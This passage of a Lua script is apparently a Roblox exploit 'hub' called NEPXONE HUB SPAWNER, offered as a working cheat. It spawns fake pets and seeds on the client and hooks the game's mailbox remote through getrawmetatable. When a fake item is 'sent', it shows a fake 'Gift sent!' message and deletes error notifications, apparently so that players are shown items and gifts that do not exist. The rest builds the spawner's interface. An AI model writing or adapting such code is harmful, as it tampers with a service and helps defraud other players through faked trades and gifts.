            v206.AnimState = not v195 and "idle" or "groundidle"
        end)
        local connection = t2[2].Heartbeat:Connect(function(dt)
            if not clone.Parent then
                return
            end

            local elapsed = os.clock()
            local CFramePosition = v185.CFrame.Position
            local v410 = math.clamp(v206.SlotHeightOffset / 1.5, 0, 1)
            local v411 = v206.FlightPhase == "Takeoff"
            local v416

            if v195 then
                local v415

                if v410 < 1 and not v411 then
                    if elapsed >= v206.SlotGroundCastNext then
                        local v412 = t2[34](CFramePosition, CFramePosition.Y)

                        if v412 then
                            v206.SlotGroundCachedY = v412
                        end

                        v206.SlotGroundCastNext = elapsed + 0.067
                    end

                    local SlotGroundCachedY = v206.SlotGroundCachedY

                    if not SlotGroundCachedY then
                        SlotGroundCachedY = v206.LastGroundY or CFramePosition.Y
                    end

                    local v414 = v206.LastGroundY or SlotGroundCachedY

                    v206.LastGroundY = v414 + (SlotGroundCachedY - v414) * math.min(1, 18 * dt)
                    v415 = v206.LastGroundY - CFramePosition.Y + v197
                else
                    v415 = v197
                end

                v416 = v415 * (1 - v410) + v197 * v410
            else
                if elapsed >= v206.SlotGroundCastNext then
                    local v417 = t2[34](CFramePosition, CFramePosition.Y)

                    if v417 then
                        v206.SlotGroundCachedY = v417
                    end

                    v206.SlotGroundCastNext = elapsed + 0.067
                end

                local SlotGroundCachedY = v206.SlotGroundCachedY

                if not SlotGroundCachedY then
                    SlotGroundCachedY = v206.LastGroundY or CFramePosition.Y
                end

                local v419 = v206.LastGroundY or SlotGroundCachedY

                v206.LastGroundY = v419 + (SlotGroundCachedY - v419) * math.min(1, 18 * dt)
                v416 = v206.LastGroundY - CFramePosition.Y + v197
            end

            Attachment.CFrame = CFrame.new(0, v416, 0) * v194

            if v195 then
                local FlightPhase = v206.FlightPhase
                local v421 = FlightPhase == "Flying" and "flying"

                if not v421 then
                    v421 = FlightPhase == "Landing" and "landing"

                    if not v421 then
                        v421 = FlightPhase == "Grounded" and "groundidle"

                        if not v421 then
                            v421 = FlightPhase ~= "Takeoff" and "flying" or "takeoff"
                        end
                    end
                end

                local v422 = v421 == "flying"

                if v422 then
                    v422 = p29.Animations

                    if v422 then
                        v422 = p29.Animations.FlyIdle
                    end
                end

                if v422 then
                    local SmoothedSpeed = v206.SmoothedSpeed
                    local AnimState = v206.AnimState

                    v421 = SmoothedSpeed > 2 and "flying"

                    if not v421 then
                        v421 = SmoothedSpeed < 0.6 and "flyidle"

                        if not v421 then
                            local v425 = AnimState ~= "flying"

                            if v425 then
                                v425 = AnimState ~= "flyidle" and "flying"
                            end

                            v421 = v425 or AnimState
                        end
                    end
                end

                v206.AnimState = v421
                v206:SwitchState(v421)

                local Character2 = t2[9].Character
                local v427 = Character2 and Character2:FindFirstChild("HumanoidRootPart")

                if v427 then
                    v427 = v427.AssemblyLinearVelocity.Magnitude
                end

                if (v427 or 0) > 1 then
                    v206.LastMoveTime = elapsed
                    v206.LandingScheduled = false
                    v206.SlotHeightOffset = math.min(v206.SlotHeightOffset + dt * 3, 3)

                    if FlightPhase == "Grounded" then
                        v206.FlightPhase = "Takeoff"
                        task.delay(0.8, function()
                            if v206.FlightPhase == "Takeoff" then
                                v206.FlightPhase = "Flying"
                            end
                        end)

                        return
                    end

                    if FlightPhase == "Landing" then
                        v206.FlightPhase = "Flying"

                        return
                    end
                else
                    local v428 = elapsed - v206.LastMoveTime

                    if FlightPhase == "Grounded" or FlightPhase == "Landing" then
                        v206.SlotHeightOffset = math.max(v206.SlotHeightOffset - dt * 2, 0)
                    end

                    local Animations = p29.Animations

                    if Animations then
                        Animations = p29.Animations.GroundIdle ~= nil
                    end

                    if Animations then
                        Animations = FlightPhase == "Flying"

                        if Animations then
                            Animations = v428 > 2

                            if Animations then
                                Animations = not v206.LandingScheduled
                            end
                        end
                    end

                    if Animations then
                        v206.LandingScheduled = true
                        v206.FlightPhase = "Landing"
                        task.delay(1.5, function()
                            if v206.FlightPhase == "Landing" then
                                v206.FlightPhase = "Grounded"
                                v206.LandingScheduled = false
                            end
                        end)

                        return
                    end
                end
            else
                local SmoothedSpeed = v206.SmoothedSpeed
                local v431 = v206.AnimState or "idle"
                local v432 = v431 == "idle"

                if v432 then
                    v432 = SmoothedSpeed > 2 and "walking"
                end

                if not v432 then
                    local v433 = v431 == "walking"

                    if v433 then
                        v433 = SmoothedSpeed < 0.6 and "idle"
                    end

                    v432 = v433 or v431
                end

                v206.AnimState = v432
                v206:SwitchState(v432)
            end
        end)
        local connection2 = t2[2].RenderStepped:Connect(function(dt)
            local Character3 = t2[9].Character
            local v436 = not Character3

            if not v436 then
                v436 = not clone.Parent
            end

            if v436 then
                return
            end

            local HumanoidRootPart = Character3:FindFirstChild("HumanoidRootPart")

            if not HumanoidRootPart then
                return
            end

            local Humanoid = Character3:FindFirstChildOfClass("Humanoid")
            local elapsed = os.clock()
            local HumanoidRootPartCFrame = HumanoidRootPart.CFrame
            local LookVector = HumanoidRootPartCFrame.LookVector
            local vector3 = Vector3.new(LookVector.X, 0, LookVector.Z)

            if vector3.Magnitude < 0.0001 then
                vector3 = Vector3.new(0, 0, -1)
            end

            local Unit = vector3.Unit
            local HumanoidRootPartCFramePosition = HumanoidRootPartCFrame.Position
            local v445 = CFrame.lookAt(HumanoidRootPartCFramePosition, HumanoidRootPartCFramePosition + Unit) * CFrame.new(v181.X, -2.5, v181.Z)
            local Position = v445.Position
            local v447 = v195

            if v447 then
                v447 = Position.Y + v206.SlotHeightOffset
            end

            local v448 = v447 or Position.Y
            local vector3_2 = Vector3.new(Position.X, v448, Position.Z)
            local v450 = v445 - v445.Position
            local CFramePosition = v185.CFrame.Position
            local v452 = vector3_2.X - CFramePosition.X
            local v453 = vector3_2.Z - CFramePosition.Z
            local v454 = math.sqrt(v452 * v452 + v453 * v453)
            local v455 = v196

            if Humanoid then
                v455 *= math.max(1, Humanoid.WalkSpeed / 16)
            end

            local v456 = 1 - math.exp(-60 * dt)
            local v457 = v455 * dt
            local vector3_2X, vector3_2Z

            if v454 <= 0.05 or v454 <= v457 then
                vector3_2X = vector3_2.X
                vector3_2Z = vector3_2.Z
            else
                local v460 = 1 / v454
                local v461 = v457 / math.max(v456, 0.001)

                vector3_2X = CFramePosition.X + v452 * v460 * v461
                vector3_2Z = CFramePosition.Z + v453 * v460 * v461
            end

            local v466

            if v195 then
                local v462 = math.clamp(v206.SlotHeightOffset / 1.5, 0, 1)
                local v465

                if v462 < 1 then
                    local v463 = t2[34](Vector3.new(vector3_2X, CFramePosition.Y, vector3_2Z), CFramePosition.Y)

                    if not v463 then
                        v463 = v206.LastChaseGroundY or CFramePosition.Y
                    end

                    local v464 = v206.LastChaseGroundY or v463

                    v206.LastChaseGroundY = v464 + (v463 - v464) * math.min(1, 18 * dt)
                    v465 = v206.LastChaseGroundY + v197
                else
                    v465 = vector3_2.Y
                end

                v466 = v465 * (1 - v462) + vector3_2.Y * v462
            else
                local v467 = t2[34](Vector3.new(vector3_2X, CFramePosition.Y, vector3_2Z), CFramePosition.Y)

                if not v467 then
                    v467 = v206.LastChaseGroundY or CFramePosition.Y
                end

                local v468 = v206.LastChaseGroundY or v467

                v206.LastChaseGroundY = v468 + (v467 - v468) * math.min(1, 18 * dt)
                v466 = v206.LastChaseGroundY + v197
            end

            local v469 = math.atan2(-v450.LookVector.X, -v450.LookVector.Z)
            local vector3_3 = Vector3.new(vector3_2X - CFramePosition.X, 0, vector3_2Z - CFramePosition.Z)

            if vector3_3.Magnitude > 0.0001 and v454 > 0.5 then
                local Unit2 = vector3_3.Unit

                v469 = math.atan2(-Unit2.X, -Unit2.Z)
            end

            local v472 = v206.LastYaw or v469

            v206.LastYaw = v472 + ((v469 - v472 + 3.141592653589793) % 6.283185307179586 - 3.141592653589793) * math.min(1, 12 * dt)
            v185.CFrame = v185.CFrame:Lerp(CFrame.new(Vector3.new(vector3_2X, v466, vector3_2Z)) * CFrame.Angles(0, v206.LastYaw, 0) * v194, v456)

            local CFramePosition2 = v185.CFrame.Position
            local LastVisualPos = v206.LastVisualPos

            if LastVisualPos then
                LastVisualPos = v206.LastVisualTime
            end

            if LastVisualPos then
                local v475 = math.max(0.001, elapsed - v206.LastVisualTime)
                local Magnitude = (CFramePosition2 - v206.LastVisualPos).Magnitude

                if Magnitude < 50 then
                    v206.SmoothedSpeed = v206.SmoothedSpeed * (1 - math.min(1, dt * 6)) + Magnitude / v475 * math.min(1, dt * 6)
                end
            end

            v206.LastVisualPos = CFramePosition2
            v206.LastVisualTime = elapsed
        end)
        p30.Parent = t2[24]
        local LocalReplica = t2[22]:GetLocalReplica()
        if LocalReplica then
            for k, v in pairs(t2[26]) do
                local v212 = k

                if v == PetId then
                    local v213 = LocalReplica.Data.Inventory.Pets[v212]

                    if not v213 then
                        break
                    end

                    v213.Equipped = true

                    local head = LocalReplica.changed_listeners.head

                    while true do
                        if not head then
                            g215 = true
                        end

                        if g215 then
                            break
                        end

                        pcall(head.listener, LocalReplica, {
                            "Inventory",
                            "Pets",
                            v212
                        })
                        pcall(head.listener, LocalReplica, "Inventory")
                        head = head.next
                    end
                end

                if g215 then
                    break
                end
            end
        end
        g215 = false
        t2[36](PetId, p28, v188, v205)
        local v216, v217 = t2[38]()
        t2[39](v216 + 1 .. "/" .. v217 .. " Pets Equipped!")
        t2[27][p30] = {
            model = clone,
            heartConn = connection,
            renderConn = connection2,
            fakePart = Part,
            idx = v179
        }
    end
    t2[45] = nil
    t2[45] = function(p31, p32, p33)
        local v226 = t2[17][p31]
        if not v226 then
            return
        end
        local AssetName = t2[23].Pets:FindFirstChild(v226.AssetName)
        if not AssetName then
            return
        end
        local Tool = Instance.new("Tool")
        local v229 = t2[18][p31]
        if v229 then
            v229 = t2[18][p31].DisplayName
        end
        Tool.Name = v229 or p31
        Tool.RequiresHandle = true
        Tool.CanBeDropped = false
        Tool.ToolTip = Tool.Name
        local v230 = t2[18][p31]
        if v230 then
            v230 = t2[18][p31].Image
        end
        if v230 then
            Tool.TextureId = t2[18][p31].Image
        end
        Tool:SetAttribute("Pet", p31)
        Tool:SetAttribute("PetId", (t2[3]:GenerateGUID(false)))
        Tool:SetAttribute("PetSize", p32 or "Normal")
        Tool:SetAttribute("PetType", p33 or "")
        local HandGrip = v226.HandGrip
        if HandGrip then
            Tool.Grip = CFrame.fromOrientation(math.rad(HandGrip.X), math.rad(HandGrip.Y), (math.rad(HandGrip.Z)))
        end
        local Part = Instance.new("Part")
        Part.Name = "Handle"
        Part.Size = Vector3.new(1, 1, 1)
        Part.Transparency = 1
        Part.CanCollide = false
        Part.Anchored = false
        Part.Parent = Tool
        local clone = AssetName:Clone()
        local RootPart = clone:FindFirstChild("RootPart")
        if not RootPart then
            RootPart = clone.PrimaryPart

            if not RootPart then
                RootPart = clone:FindFirstChildWhichIsA("BasePart")
            end
        end
        if not RootPart then
            clone:Destroy()

            return
        end
        clone.PrimaryPart = RootPart
        for _, descendant in ipairs(clone:GetDescendants()) do
            if descendant:IsA("BasePart") then
                descendant.CanCollide = false
                descendant.Anchored = false
            end
        end
        local GetScale = t2[19].GetScale
        local BigScale = v226.BigScale
        local HugeScale = v226.HugeScale
        local v240 = GetScale(p32, {
            Big = BigScale,
            Huge = HugeScale
        })
        if v240 ~= 1 then
            clone:ScaleTo(v240)
        end
        clone:SetPrimaryPartCFrame(Part.CFrame)
        clone.Parent = Tool
        local GetDescendants = clone.GetDescendants
        for v244, v245 in ipairs(GetDescendants(clone)) do

            if v245:IsA("BasePart") then
                local WeldConstraint = Instance.new("WeldConstraint")

                WeldConstraint.Part0 = Part
                WeldConstraint.Part1 = v245
                WeldConstraint.Parent = Part
            end
        end
        local AnimationController = clone:FindFirstChildOfClass("AnimationController")
        if not AnimationController then
            AnimationController = Instance.new("AnimationController")
            AnimationController.Parent = clone
        end
        local Animator = AnimationController:FindFirstChildOfClass("Animator")
        if not Animator then
            Animator = Instance.new("Animator")
            Animator.Parent = AnimationController
        end
        local Animations = clone:FindFirstChild("Animations")
        if Animations then
            local v250 = Animations:FindFirstChild(not v226.IsFlying and "Idle" or "Fly")

            if v250 then
                local ok, result = pcall(function()
                    return Animator:LoadAnimation(v250)
                end)

                if ok and result then
                    result.Looped = true
                    result:Play()
                end
            end
        end
        Tool.Activated:Connect(function()
            t2[44](p31, v226, Tool)
        end)
        Tool.AncestryChanged:Connect(function()
            if not Tool:IsDescendantOf(game) then
                local v477 = t2[27][Tool]

                if v477 then
                    v477.heartConn:Disconnect()
                    v477.renderConn:Disconnect()

                    local model = v477.model

                    if model then
                        model = v477.model.Parent
                    end

                    if model then
                        v477.model:Destroy()
                    end

                    local fakePart = v477.fakePart

                    if fakePart then
                        fakePart = v477.fakePart.Parent
                    end

                    if fakePart then
                        v477.fakePart:Destroy()
                    end

                    t2[27][Tool] = nil
                end
            end
        end)
        Tool.Parent = t2[9].Backpack
        table.insert(t2[28], Tool)

        return Tool
    end
    t2[46] = function(p34, p35, p36)
        local v221 = t2[45](p34, p35, p36)

        if not v221 then
            return
        end

        local PetId = v221:GetAttribute("PetId")

        t2[40](p34, p35, p36, PetId)

        return v221
    end
    local MailboxItemCatalog = require(t2[9].PlayerScripts.Controllers.MailboxController.MailboxItemCatalog)

    t2[47] = MailboxItemCatalog.IsGiftable
    function MailboxItemCatalog.IsGiftable(p37, p38, p39)
        if p37 == "Pets" or p37 == "Seeds" then
            return true
        end

        return t2[47](p37, p38, p39)
    end
    task.spawn(function()
        local t6 = {
            "could not",
            "don't have",
            "not send",
            "you don",
            "try again"
        }

        t2[9].PlayerGui:WaitForChild("TopNotification"):WaitForChild("Frame").ChildAdded:Connect(function(child)
            task.spawn(function()
                local Content = child:WaitForChild("Content", 5)

                if Content then
                    Content = Content:WaitForChild("TextLabel", 5)
                end

                local v490 = Content

                if not v490 then
                    return
                end

                local function v491()
                    local v493 = v490.Text:lower()

                    if v493:find("gift sent") then
                        if v490.Text ~= "Gift sent!" then
                            v490.Text = "Gift sent!"
                        end

                        return true
                    end

                    for _, v in ipairs(t6) do
                        if v493:find(v) then
                            child:Destroy()

                            return true
                        end
                    end

                    return false
                end

                if not v491() then
                    local connection
                    connection = v490:GetPropertyChangedSignal("Text"):Connect(function()
                        if child.Parent == nil or v491() then
                            connection:Disconnect()
                        end
                    end)
                end
            end)
        end)
    end)
    t2[48] = nil
    task.spawn(function()
        t2[48] = game:GetService("SoundService"):WaitForChild("SFX"):WaitForChild("Notification")
    end)
    t2[49] = function()
        local MailboxUI = t2[9].PlayerGui:FindFirstChild("MailboxUI")

        if not MailboxUI then
            return
        end

        local Frame = MailboxUI:FindFirstChild("Frame")

        if Frame then
            Frame = MailboxUI.Frame:FindFirstChild("SendingFrame")
        end

        if not Frame then
            return
        end

        local ItemSendFrame = Frame:FindFirstChild("ItemSendFrame")
        local SelectPlayerFrame = Frame:FindFirstChild("SelectPlayerFrame")

        if ItemSendFrame then
            ItemSendFrame.Visible = false
        end

        if SelectPlayerFrame then
            SelectPlayerFrame.Visible = true
        end
    end
    t2[50] = t2[21].Mailbox.SendBatch
    local v20 = getrawmetatable(t2[50])

    t2[51] = v20.Fire
    function v20.Fire(p40, p41, p42, p43)
        if p40 ~= t2[50] then
            return t2[51](p40, p41, p42, p43)
        end
        local t7 = {}
        local v266 = p42
        local n2 = 0
        local _ipairs = ipairs
        if not p42 then
            v266 = {}
        end
        for v271, v272 in _ipairs(v266) do

            if t2[25][v272.ItemKey] then
                n2 += 1

                if v272.Category == "Seeds" then
                    t2[42](v272.ItemKey, v272.Count)
                else
                    t2[43](v272.ItemKey)
                end
            else
                table.insert(t7, v272)
            end
        end
        if n2 > 0 then
            local _ = os.clock() + 3

            if t2[48] then
                t2[48].Volume = 0
            end

            task.spawn(function()
                task.wait(0.3)
                t2[49]()

                local MailboxUI = t2[9].PlayerGui:FindFirstChild("MailboxUI")

                if MailboxUI then
                    local Frame = MailboxUI:FindFirstChild("Frame")

                    if Frame then
                        Frame = MailboxUI.Frame:FindFirstChild("Info")
                    end

                    if Frame then
                        Frame.Text = "Gift sent!"
                    end
                end

                if t2[48] then
                    t2[48].Volume = 1
                    t2[48]:Play()
                end

                t2[39]("Gift sent!")
            end)

            if #t7 > 0 then
                return t2[51](p40, p41, t7, p43)
            end

            return
        end

        return t2[51](p40, p41, p42, p43)
    end
    t2[52] = t2[21].Pets.RequestUnequip.Fire
    t2[21].Pets.RequestUnequip.Fire = function(p44, p45)
        local g287
        for k, v in pairs(t2[27]) do
            local v278 = k

            if p45 == v278:GetAttribute("PetId") then
                v.heartConn:Disconnect()
                v.renderConn:Disconnect()

                local model = v.model

                if model then
                    model = v.model.Parent
                end

                if model then
                    v.model:Destroy()
                end

                local fakePart = v.fakePart

                if fakePart then
                    fakePart = v.fakePart.Parent
                end

                if fakePart then
                    v.fakePart:Destroy()
                end

                t2[27][v278] = nil
                v278.Parent = t2[9].Backpack
                t2[37](p45)

                local LocalReplica = t2[22]:GetLocalReplica()

                if LocalReplica then
                    for k2, v2 in pairs(t2[26]) do
                        local v284 = k2

                        if v2 == p45 then
                            local v285 = LocalReplica.Data.Inventory.Pets[v284]

                            if not v285 then
                                break
                            end

                            v285.Equipped = false

                            local head = LocalReplica.changed_listeners.head

                            while true do
                                if not head then
                                    g287 = true
                                end

                                if g287 then
                                    break
                                end

                                pcall(head.listener, LocalReplica, {
                                    "Inventory",
                                    "Pets",
                                    v284
                                })
                                pcall(head.listener, LocalReplica, "Inventory")
                                head = head.next
                            end
                        end

                        if g287 then
                            break
                        end
                    end
                end

                g287 = false

                local v288, v289 = t2[38]()

                t2[39](v288 .. "/" .. v289 .. " Pets Equipped!")

                return
            end
        end

        return t2[52](p44, p45)
    end
    local ScreenGui = Instance.new("ScreenGui")

    -- rename the gui to NEPXONE-HUB
    ScreenGui.Name = "NEPXONE-HUB"
    ScreenGui.ResetOnSpawn = false
    ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    t2[53] = Instance.new("Frame")
    t2[53].Name = "MainFrame"
    t2[53].Size = UDim2.new(0, 360, 0, 380)
    t2[53].Position = UDim2.new(0.5, -180, 0.4, -190)
    -- main background adjusted to a darker red
    t2[53].BackgroundColor3 = Color3.fromRGB(36, 10, 10)
    t2[53].BorderSizePixel = 0
    t2[53].Active = true
    t2[53].Draggable = true
    t2[53].Parent = ScreenGui
    local UICorner = Instance.new("UICorner")

    UICorner.CornerRadius = UDim.new(0, 12)
    UICorner.Parent = t2[53]

    local TextLabel = Instance.new("TextLabel")

    TextLabel.Size = UDim2.new(1, -40, 0, 22)
    TextLabel.Position = UDim2.new(0, 16, 0, 12)
    TextLabel.BackgroundTransparency = 1
    -- rename title to NEPXONE-HUB BY BUILDERPH
    TextLabel.Text = "NEPXONE-HUB BY BUILDERPH"
    TextLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
    TextLabel.TextSize = 11
    TextLabel.Font = Enum.Font.SourceSansBold
    TextLabel.TextXAlignment = Enum.TextXAlignment.Left
    TextLabel.Parent = t2[53]

    local TextLabel2 = Instance.new("TextLabel")

    TextLabel2.Size = UDim2.new(1, -40, 0, 28)
    TextLabel2.Position = UDim2.new(0, 16, 0, 28)
    TextLabel2.BackgroundTransparency = 1
    -- rename spawner label to NEPXONE HUB SPAWNER
    TextLabel2.Text = "NEPXONE HUB SPAWNER"
    TextLabel2.TextColor3 = Color3.fromRGB(255, 255, 255)
    TextLabel2.TextSize = 18
    TextLabel2.Font = Enum.Font.SourceSansBold
    TextLabel2.TextXAlignment = Enum.TextXAlignment.Left
    TextLabel2.Parent = t2[53]

    local TextButton = Instance.new("TextButton")

    TextButton.Size = UDim2.new(0, 24, 0, 24)
    TextButton.Position = UDim2.new(1, -36, 0, 20)
    TextButton.BackgroundColor3 = Color3.fromRGB(60, 20, 20)
    TextButton.Text = "✖"
    TextButton.TextColor3 = Color3.fromRGB(230, 230, 230)
    TextButton.TextSize = 14
    TextButton.Font = Enum.Font.SourceSansBold
    TextButton.Parent = t2[53]

    local UICorner2 = Instance.new("UICorner")

    UICorner2.CornerRadius = UDim.new(0, 6)
    UICorner2.Parent = TextButton
    TextButton.MouseButton1Click:Connect(function()
        t2[53].Visible = false
    end)

    local Frame = Instance.new("Frame")

    Frame.Size = UDim2.new(1, -32, 0, 38)
    Frame.Position = UDim2.new(0, 16, 0, 66)
    Frame.BackgroundColor3 = Color3.fromRGB(50, 15, 15)
    Frame.BorderSizePixel = 0
    Frame.Parent = t2[53]

    local UICorner3 = Instance.new("UICorner")

    UICorner3.CornerRadius = UDim.new(0, 8)
    UICorner3.Parent = Frame
    t2[54] = Instance.new("TextButton")
    t2[54].Size = UDim2.new(0, 72, 1, -8)
    t2[54].Position = UDim2.new(0, 4, 0, 4)
    t2[54].BackgroundColor3 = Color3.fromRGB(220, 80, 90) -- red button
    t2[54].Text = "Pets"
    t2[54].TextColor3 = Color3.fromRGB(10, 10, 10)
    t2[54].TextSize = 14
    t2[54].Font = Enum.Font.SourceSansBold
    t2[54].Parent = Frame
    local UICorner4 = Instance.new("UICorner")

    UICorner4.CornerRadius = UDim.new(0, 6)
    UICorner4.Parent = t2[54]
    t2[55] = Instance.new("TextButton")
    t2[55].Size = UDim2.new(0, 72, 1, -8)
    t2[55].Position = UDim2.new(0, 80, 0, 4)
    t2[55].BackgroundColor3 = Color3.fromRGB(60, 18, 18)
    t2[55].Text = "Seeds"
    t2[55].TextColor3 = Color3.fromRGB(200, 200, 200)
    t2[55].TextSize = 14
    t2[55].Font = Enum.Font.SourceSansBold
    t2[55].Parent = Frame
    local UICorner5 = Instance.new("UICorner")

    UICorner5.CornerRadius = UDim.new(0, 6)
    UICorner5.Parent = t2[55]
    t2[56] = Instance.new("TextButton")
    t2[56].Size = UDim2.new(0, 72, 1, -8)
    t2[56].Position = UDim2.new(0, 156, 0, 4)
    t2[56].BackgroundColor3 = Color3.fromRGB(60, 18, 18)
    t2[56].Text = "Kg"
    t2[56].TextColor3 = Color3.fromRGB(200, 200, 200)
    t2[56].TextSize = 14
    t2[56].Font = Enum.Font.SourceSansBold
    t2[56].Parent = Frame
    local UICorner6 = Instance.new("UICorner")

    UICorner6.CornerRadius = UDim.new(0, 6)
    UICorner6.Parent = t2[56]
    t2[57] = Instance.new("Frame")
    t2[57].Name = "PetViewFrame"
    t2[57].Size = UDim2.new(1, 0, 1, -110)
    t2[57].Position = UDim2.new(0, 0, 0, 110)
    t2[57].BackgroundTransparency = 1
    t2[57].Visible = true
    t2[57].Parent = t2[53]
    t2[58] = Instance.new("Frame")
    t2[58].Name = "SeedViewFrame"
    t2[58].Size = UDim2.new(1, 0, 1, -110)
    t2[58].Position = UDim2.new(0, 0, 0, 110)
    t2[58].BackgroundTransparency = 1
    t2[58].Visible = false
    t2[58].Parent = t2[53]
    t2[59] = Instance.new("Frame")
    t2[59].Name = "KgViewFrame"
    t2[59].Size = UDim2.new(1, 0, 1, -110)
    t2[59].Position = UDim2.new(0, 0, 0, 110)
    t2[59].BackgroundTransparency = 1
    t2[59].Visible = false
    t2[59].Parent = t2[53]

    local function v32(p46, p47)

        for v294, v295 in ipairs({
            t2[54],
            t2[55],
            t2[56]
        }) do

            v295.BackgroundColor3 = Color3.fromRGB(60, 18, 18)
            v295.TextColor3 = Color3.fromRGB(200, 200, 200)
        end
        for _, v in ipairs({
            t2[57],
            t2[58],
            t2[59]
        }) do
            v.Visible = false
        end
        p46.BackgroundColor3 = Color3.fromRGB(220, 80, 90)
        p46.TextColor3 = Color3.fromRGB(10, 10, 10)
        p47.Visible = true
    end
    t2[54].MouseButton1Click:Connect(function()
        v32(t2[54], t2[57])
    end)
    t2[55].MouseButton1Click:Connect(function()
        v32(t2[55], t2[58])
    end)
    t2[56].MouseButton1Click:Connect(function()
        v32(t2[56], t2[59])
    end)
    t2[60] = Instance.new("TextBox")
    t2[60].Size = UDim2.new(1, -32, 0, 44)
    t2[60].Position = UDim2.new(0, 16, 0, 6)
    t2[60].BackgroundColor3 = Color3.fromRGB(40, 20, 20)
    t2[60].BorderSizePixel = 0
    t2[60].Text = "Raccoon"
    t2[60].TextColor3 = Color3.fromRGB(255, 255, 255)
    t2[60].TextSize = 15
    t2[60].Font = Enum.Font.SourceSans
    t2[60].TextXAlignment = Enum.TextXAlignment.Left
    t2[60].ClearTextOnFocus = false
    t2[60].Parent = t2[57]

    local UIPadding = Instance.new("UIPadding")

    UIPadding.PaddingLeft = UDim.new(0, 12)
    UIPadding.Parent = t2[60]

    local UICorner7 = Instance.new("UICorner")

    UICorner7.CornerRadius = UDim.new(0, 8)
    UICorner7.Parent = t2[60]
    t2[61] = "Normal"
    t2[62] = "Normal"
    t2[63] = Instance.new("Frame")
    t2[63].Name = "DropdownLayer"
    t2[63].Size = UDim2.new(1, 0, 1, 0)
    t2[63].BackgroundTransparency = 1
    t2[63].BorderSizePixel = 0
    t2[63].ZIndex = 100
    t2[63].Parent = t2[53]
    t2[64] = nil
    local function v35(p48, p49, p50, p51)
        local TextButton2 = Instance.new("TextButton")

        TextButton2.Size = UDim2.new(1, -32, 0, 44)
        TextButton2.Position = p48
        TextButton2.BackgroundColor3 = Color3.fromRGB(40, 20, 20)
        TextButton2.Text = p49 .. ": Normal"
        TextButton2.TextColor3 = Color3.fromRGB(230, 230, 230)
        TextButton2.TextSize = 14
        TextButton2.Font = Enum.Font.SourceSans
        TextButton2.TextXAlignment = Enum.TextXAlignment.Left
        TextButton2.Parent = t2[57]

        local UIPadding2 = Instance.new("UIPadding")

        UIPadding2.PaddingLeft = UDim.new(0, 12)
        UIPadding2.Parent = TextButton2

        local UICorner8 = Instance.new("UICorner")

        UICorner8.CornerRadius = UDim.new(0, 8)
        UICorner8.Parent = TextButton2

        local TextLabel3 = Instance.new("TextLabel")

        TextLabel3.Size = UDim2.new(0, 20, 1, 0)
        TextLabel3.Position = UDim2.new(1, -32, 0, 0)
        TextLabel3.BackgroundTransparency = 1
        TextLabel3.Text = "▾"
        TextLabel3.TextColor3 = Color3.fromRGB(150, 150, 150)
        TextLabel3.TextSize = 12
        TextLabel3.Font = Enum.Font.SourceSans
        TextLabel3.Parent = TextButton2

        local Frame2 = Instance.new("Frame")

        Frame2.Size = UDim2.new(1, 0, 0, #p50 * 32)
        Frame2.Position = UDim2.new(p48.X.Scale, p48.X.Offset, p48.Y.Scale + 0.32, p48.Y.Offset + 6)
        Frame2.BackgroundColor3 = Color3.fromRGB(25, 25, 27)
        Frame2.BorderSizePixel = 0
        Frame2.ZIndex = 105
        Frame2.Visible = false
        Frame2.Parent = t2[63]

        local UICorner9 = Instance.new("UICorner")

        UICorner9.CornerRadius = UDim.new(0, 6)
        UICorner9.Parent = Frame2

        for i, v in ipairs(p50) do
            local v310 = v
            local TextButton3 = Instance.new("TextButton")

            TextButton3.Size = UDim2.new(1, 0, 0, 32)
            TextButton3.Position = UDim2.new(0, 0, 0, (i - 1) * 32)
            TextButton3.BackgroundTransparency = 1
            TextButton3.Text = v310
            TextButton3.TextColor3 = Color3.fromRGB(220, 220, 220)
            TextButton3.TextSize = 14
            TextButton3.Font = Enum.Font.SourceSans
            TextButton3.ZIndex = 110
            TextButton3.Parent = Frame2
            TextButton3.MouseButton1Click:Connect(function()
                TextButton2.Text = p49 .. ": " .. v310
                Frame2.Visible = false

                if t2[64] == Frame2 then
                    t2[64] = nil
                end

                p51(v310)
            end)
        end

        TextButton2.MouseButton1Click:Connect(function()
            if t2[64] and t2[64] ~= Frame2 then
                t2[64].Visible = false
            end

            Frame2.Visible = not Frame2.Visible

            if Frame2.Visible then
                t2[64] = Frame2

                return
            end

            if t2[64] == Frame2 then
                t2[64] = nil
            end
        end)
    end
    v35(UDim2.new(0, 16, 0, 62), "Size", {
        "Normal",
        "Mega",
        "Huge"
    }, function(p52)
        t2[61] = p52
    end)
    v35(UDim2.new(0, 16, 0, 114), "Variant", {
        "Normal",
        "Rainbow"
    }, function(p53)
        t2[62] = p53
    end)

    local TextButton4 = Instance.new("TextButton")

    TextButton4.Size = UDim2.new(1, -32, 0, 48)
    TextButton4.Position = UDim2.new(0, 16, 0, 164)
    TextButton4.BackgroundColor3 = Color3.fromRGB(220, 80, 90)
    TextButton4.Text = "SPAWN PET"
    TextButton4.TextColor3 = Color3.fromRGB(15, 15, 15)
    TextButton4.TextSize = 15
    TextButton4.Font = Enum.Font.SourceSansBold
    TextButton4.Parent = t2[57]

    local UICorner10 = Instance.new("UICorner")

    UICorner10.CornerRadius = UDim.new(0, 10)
    UICorner10.Parent = TextButton4
    t2[65] = Instance.new("TextBox")
    t2[65].Size = UDim2.new(1, -32, 0, 44)
    t2[65].Position = UDim2.new(0, 16, 0, 6)
    t2[65].BackgroundColor3 = Color3.fromRGB(40, 20, 20)
    t2[65].BorderSizePixel = 0
    t2[65].Text = "Dragon's Breath"
    t2[65].TextColor3 = Color3.fromRGB(255, 255, 255)
    t2[65].TextSize = 15
    t2[65].Font = Enum.Font.SourceSans
    t2[65].TextXAlignment = Enum.TextXAlignment.Left
    t2[65].ClearTextOnFocus = false
    t2[65].Parent = t2[58]

    local UIPadding3 = Instance.new("UIPadding")

    UIPadding3.PaddingLeft = UDim.new(0, 12)
    UIPadding3.Parent = t2[65]

    local UICorner11 = Instance.new("UICorner")

    UICorner11.CornerRadius = UDim.new(0, 8)
    UICorner11.Parent = t2[65]

    local TextButton5 = Instance.new("TextButton")

    TextButton5.Size = UDim2.new(1, -32, 0, 48)
    TextButton5.Position = UDim2.new(0, 16, 0, 62)
    TextButton5.BackgroundColor3 = Color3.fromRGB(160, 230, 160)
    TextButton5.Text = "SPAWN SEED"
    TextButton5.TextColor3 = Color3.fromRGB(15, 15, 15)
    TextButton5.TextSize = 15
    TextButton5.Font = Enum.Font.SourceSansBold
    TextButton5.Parent = t2[58]

